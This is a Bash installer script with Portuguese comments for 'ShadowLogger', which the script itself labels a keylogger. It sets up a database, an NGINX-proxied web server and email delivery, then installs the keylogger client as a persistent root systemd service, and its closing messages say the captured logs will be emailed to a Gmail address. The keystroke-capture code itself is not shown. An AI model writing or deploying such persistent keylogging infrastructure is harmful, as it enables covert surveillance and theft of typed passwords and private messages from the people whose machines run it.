#!/bin/bash
# install-shadowlogger.sh — Para rodar em "tsunami"
# Desenvolvido por: Renato M. F. Nascimento
# Versão: 1.0.0 - 2026

set -e

echo "🚀 Instalando ShadowLogger em $(hostname)..."
echo "📅 $(date)"

# Configurações
INSTALL_DIR="$HOME/ShadowLogger-Linux"
GITHUB_REPO="https://github.com/renatomfn6/ShadowLogger-Linux.git"
PENDRIVE_PATH="/media/renato/SHADOWLOGGER"

# 1. Clona do GitHub (se disponível) ou usa pendrive
echo "🌐 Verificando repositório..."

if git ls-remote "$GITHUB_REPO" >/dev/null 2>&1; then
    echo "✅ GitHub disponível - clonando..."
    if [ ! -d "$INSTALL_DIR" ]; then
        git clone "$GITHUB_REPO" "$INSTALL_DIR"
    else
        cd "$INSTALL_DIR" && git pull
    fi
elif [ -d "$PENDRIVE_PATH" ]; then
    echo "💾 Pendrive disponível - copiando..."
    cp -r "$PENDRIVE_PATH"/* "$INSTALL_DIR/"
else
    echo "⚠️ Nenhum repositório encontrado."
    echo "   - Conecte o pendrive em $PENDRIVE_PATH"
    echo "   - Ou crie o repositório em $GITHUB_REPO"
    exit 1
fi

cd "$INSTALL_DIR"

# 2. Instala dependências do sistema
echo "🔧 Instalando dependências do sistema..."
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip python3-venv git nginx postgresql postgresql-contrib certbot python3-certbot-nginx

# 3. Configura PostgreSQL
echo "🗄️ Configurando PostgreSQL..."
sudo -u postgres psql <<EOF
CREATE USER shadowuser WITH PASSWORD 'sua_senha_segura' 2>/dev/null || true;
CREATE DATABASE shadowdb OWNER shadowuser 2>/dev/null || true;
GRANT ALL PRIVILEGES ON DATABASE shadowdb TO shadowuser;
EOF

# 4. Cria ambiente virtual e instala Python
echo "🐍 Configurando ambiente Python..."
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# 5. Configura ShadowServer
echo "🌐 Configurando ShadowServer..."
cd shadowserver

# Cria .env se não existir
if [ ! -f .env ]; then
    cat > .env <<EOF
DATABASE_URL=postgresql://shadowuser:sua_senha_segura@localhost/shadowdb
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
EMAIL_SENDER=renatomfn6@gmail.com
EMAIL_PASSWORD=seu-app-password
EOF
fi

# Configura NGINX
echo "⚙️ Configurando NGINX..."
sudo tee /etc/nginx/sites-available/shadowserver > /dev/null <<'EOF'
server {
    listen 80;
    server_name _;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location /ws {
        proxy_pass http://127.0.0.1:5000/ws;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
    }
}
EOF

sudo ln -sf /etc/nginx/sites-available/shadowserver /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx

# Configura systemd service
echo "🔧 Configurando ShadowServer service..."
sudo tee /etc/systemd/system/shadowserver.service > /dev/null <<'EOF'
[Unit]
Description=ShadowLogger Web Server
After=network.target postgresql.service

[Service]
User=renato
WorkingDirectory=/home/renato/ShadowLogger-Linux/shadowserver
EnvironmentFile=/home/renato/ShadowLogger-Linux/shadowserver/.env
ExecStart=/home/renato/ShadowLogger-Linux/venv/bin/python app.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reexec
sudo systemctl enable --now shadowserver

# 6. Configura ShadowLogger (cliente)
echo "⌨️ Configurando ShadowLogger (cliente)..."
cd ../shadowlogger

# Cria service para cliente
sudo tee /etc/systemd/system/shadowlogger.service > /dev/null <<'EOF'
[Unit]
Description=ShadowLogger Keylogger
After=network.target

[Service]
User=root
WorkingDirectory=/home/renato/ShadowLogger-Linux/shadowlogger
ExecStart=/usr/bin/python3 /home/renato/ShadowLogger-Linux/shadowlogger/main.py
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now shadowlogger

# Finaliza
echo ""
echo "========================================"
echo "✅ Instalação concluída!"
echo "========================================"
echo "🌐 Acesse: http://$(hostname -I | awk '{print $1}'):5000"
echo "📧 Logs serão enviados para: renatomfn6@gmail.com"
echo ""
echo "💡 Dica: Para ver logs em tempo real:"
echo "   journalctl -u shadowserver -f"
echo "   journalctl -u shadowlogger -f"
echo ""
echo "🚀 ShadowLogger está rodando em $(hostname)!"
